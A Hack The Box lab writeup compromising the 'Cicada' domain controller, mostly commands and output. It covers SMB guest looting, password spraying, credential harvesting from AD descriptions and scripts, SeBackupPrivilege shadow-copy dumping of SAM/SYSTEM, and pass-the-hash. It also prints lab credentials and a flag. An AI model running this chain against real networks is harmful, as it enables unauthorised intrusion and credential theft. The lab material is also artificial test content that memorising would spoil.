# HTB Cicada — Writeup

**Target:** 10.129.231.149 (`CICADA-DC.cicada.htb`)
**Domain:** `cicada.htb`
**OS:** Windows Server 2022 Build 20348 (Domain Controller)
**Difficulty:** Easy

---

## 1. Recon

### Nmap

```bash
nmap -sV -sC -Pn 10.129.231.149 --reason
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 53   | DNS     | Simple DNS Plus |
| 88   | Kerberos | |
| 135/139/445 | RPC/SMB | `microsoft-ds?` unnamed — SMB signing enabled and required |
| 389/636/3268/3269 | LDAP/LDAPS | Domain: `cicada.htb`, Site: `Default-First-Site-Name` |
| 464  | kpasswd5 | |
| 5985 | WinRM (HTTP) | Microsoft-HTTPAPI/2.0 |

Certificate CN confirms the DC hostname: `CICADA-DC.cicada.htb`.

Added to `/etc/hosts`:

```bash
echo "10.129.231.149 cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

---

## 2. Initial Enumeration — SMB Guest Access

Guest/anonymous SMB session works:

```bash
crackmapexec smb 10.129.231.149 -u '' -p '' --shares
```

```
SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\guest:
Share      Permissions   Remark
-----      -----------   ------
ADMIN$                   Remote Admin
C$                       Default share
DEV
HR         READ
IPC$       READ          Remote IPC
NETLOGON                 Logon server share
SYSVOL                   Logon server share
```

`HR` is guest-readable; `DEV` is listed but access-denied for guest.

### Loot: HR share

```bash
smbclient -N //10.129.231.149/HR
smb: \> get "Notice from HR.txt"
```

`Notice from HR.txt` contains a default onboarding password:

```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

---

## 3. Domain User Enumeration

Null RPC / anonymous LDAP binds were both rejected:

```bash
rpcclient -U "" -N 10.129.231.149        # enumdomusers -> ACCESS_DENIED
ldapsearch -x -H ldap://10.129.231.149 -b "DC=cicada,DC=htb" "(objectClass=user)"   # bind failure
```

RID cycling via the `guest` account (authenticated SMB session), however, works:

```bash
crackmapexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute
```

Extracted domain users:

```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

---

## 4. Password Spray → Foothold Chain

### 4.1 Spray the HR default password

```bash
crackmapexec smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

Result: **`michael.wrightson`** is still using the default password.

### 4.2 Pull user descriptions (michael has read rights via SAMR)

```bash
crackmapexec smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

`david.orelious`'s AD **description field** leaks a password:

```
desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

### 4.3 David's access → DEV share

```bash
crackmapexec smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

David now has **READ** on `DEV` (guest/michael did not). WinRM login fails for him (not in Remote Management Users).

```bash
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.129.231.149/DEV
smb: \> get Backup_script.ps1
```

`Backup_script.ps1` hardcodes another credential:

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

### 4.4 Emily → WinRM foothold

```bash
crackmapexec winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
# [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

**User flag:**
```
C:\Users\emily.oscars.CICADA\Desktop\user.txt
6989d6314f1f5b8634e40e52cd459b73
```

### Credential chain summary

```
HR share (guest read)
  └─ default password: Cicada$M6Corpb*@Lp#nZp!8
       └─ valid for: michael.wrightson (still default)
            └─ SAMR user-description read: david.orelious desc → aRt$Lp#7t*VQ!3
                 └─ DEV share read access → Backup_script.ps1 → emily.oscars : Q!3@Lp#M6b*7t*Vt
                      └─ WinRM access (Remote Management Users) → FOOTHOLD
```

---

## 5. Privilege Escalation — Backup Operators / SeBackupPrivilege

```powershell
whoami /priv
whoami /groups
```

```
SeBackupPrivilege    Back up files and directories    Enabled
SeRestorePrivilege   Restore files and directories    Enabled
...
BUILTIN\Backup Operators    Alias    S-1-5-32-551
```

`emily.oscars` is a member of **Backup Operators** with `SeBackupPrivilege` enabled — this allows reading *any* file on disk regardless of ACLs, including the live SAM/SYSTEM registry hives, via a Volume Shadow Copy (bypasses the file lock on `C:\Windows\System32\config\SAM`).

### 5.1 Create a shadow copy with `diskshadow`

The `Documents` folder is read-only for the diskshadow metadata `.cab`, so `set metadata` was redirected to `C:\Windows\Temp`.

```powershell
Add-Content -Path C:\Users\emily.oscars.CICADA\Documents\dsscript.txt -Value "set metadata C:\Windows\Temp\meta.cab"
Add-Content -Path C:\Users\emily.oscars.CICADA\Documents\dsscript.txt -Value "set context persistent nowriters"
Add-Content -Path C:\Users\emily.oscars.CICADA\Documents\dsscript.txt -Value "add volume C: alias cdrive"
Add-Content -Path C:\Users\emily.oscars.CICADA\Documents\dsscript.txt -Value "create"
Add-Content -Path C:\Users\emily.oscars.CICADA\Documents\dsscript.txt -Value "expose %cdrive% Z:"

diskshadow /s C:\Users\emily.oscars.CICADA\Documents\dsscript.txt
```

Shadow copy is exposed as `Z:\`.

> **Note:** using a here-string (`@" ... "@`) directly for the diskshadow script caused `nowriters` to be mis-parsed as `nowriter`; building the file line-by-line with `Add-Content` avoided the issue.

### 5.2 Copy SAM/SYSTEM out of the shadow copy

```powershell
mkdir C:\Users\emily.oscars.CICADA\Documents\backup
robocopy /b Z:\Windows\System32\config C:\Users\emily.oscars.CICADA\Documents\backup SAM SYSTEM
```

### 5.3 Exfil via evil-winrm

```
cd C:\Users\emily.oscars.CICADA\Documents\backup
download SAM
download SYSTEM
```

> **Note:** evil-winrm's `download` fails on absolute Windows paths from within a subdirectory (`Check filenames or paths`) — `cd` into the target directory first and download by relative filename.

### 5.4 Extract the local Administrator hash (offline, on attacker host)

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 5.5 Pass-the-Hash as Administrator

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

**Root flag:**
```
C:\Users\Administrator\Desktop\root.txt
```

---

## 6. Root Cause / Takeaways

- **Guest SMB access** should never expose a share with sensitive onboarding docs (`HR` share leaking a default password).
- **Default passwords** were never rotated for at least one account (`michael.wrightson`).
- **Cleartext/hinted passwords in AD attributes** (`description` field) are a very common misconfiguration and trivially dumped once any authenticated SAMR session is available.
- **Hardcoded credentials in scripts** on a share (`Backup_script.ps1`) is another classic real-world finding.
- **Backup Operators membership** effectively grants full read (and write/restore) access to the filesystem regardless of NTFS ACLs, because `SeBackupPrivilege`/`SeRestorePrivilege` override DACLs. This should be treated as equivalent to local admin and restricted accordingly.

---

## 7. Tools Used

- `nmap`
- `crackmapexec`
- `smbclient`
- `rpcclient`
- `evil-winrm`
- `diskshadow` / `robocopy` (native Windows)
- `impacket-secretsdump`

---

## 8. Full Credential / Flag Summary

| Item | Value |
|---|---|
| Default password (HR note) | `Cicada$M6Corpb*@Lp#nZp!8` |
| michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` (default, unrotated) |
| david.orelious | `aRt$Lp#7t*VQ!3` (AD description field) |
| emily.oscars | `Q!3@Lp#M6b*7t*Vt` (Backup_script.ps1 on DEV share) |
| Administrator NTHash | `2b87e7c93a3e8a0ea4a581937016f341` |
| user.txt | `6989d6314f1f5b8634e40e52cd459b73` |
| root.txt | *(captured via Administrator PtH session)* |